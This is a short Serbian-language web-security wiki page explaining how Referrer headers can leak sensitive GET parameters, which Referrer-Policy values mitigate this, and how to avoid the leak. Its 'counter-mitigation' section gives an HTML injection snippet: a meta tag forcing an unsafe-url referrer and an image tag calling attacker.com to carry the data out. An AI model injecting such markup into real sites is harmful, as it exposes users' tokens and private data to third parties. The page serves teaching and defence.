{{#include ./banners/hacktricks-training.md}}

# Referrer headers and policy

Referrer je header koji koriste pregledači da označe koja je bila prethodna stranica koja je posetjena.

## Osetljive informacije otkrivene

Ako se u nekom trenutku unutar web stranice bilo koja osetljiva informacija nalazi u GET zahtevima, ako stranica sadrži linkove ka spoljnim izvorima ili napadač može da natera/predloži (socijalno inženjerstvo) korisniku da poseti URL koji kontroliše napadač. To bi moglo omogućiti eksfiltraciju osetljivih informacija unutar poslednjeg GET zahteva.

## Mitigacija

Možete naterati pregledač da prati **Referrer-policy** koja bi mogla **izbeći** slanje osetljivih informacija drugim web aplikacijama:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

Možete prepisati ovo pravilo koristeći HTML meta tag (napadač treba da iskoristi i HTML injekciju):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Odbrana

Nikada ne stavljajte osetljive podatke unutar GET parametara ili putanja u URL-u.

{{#include ./banners/hacktricks-training.md}}
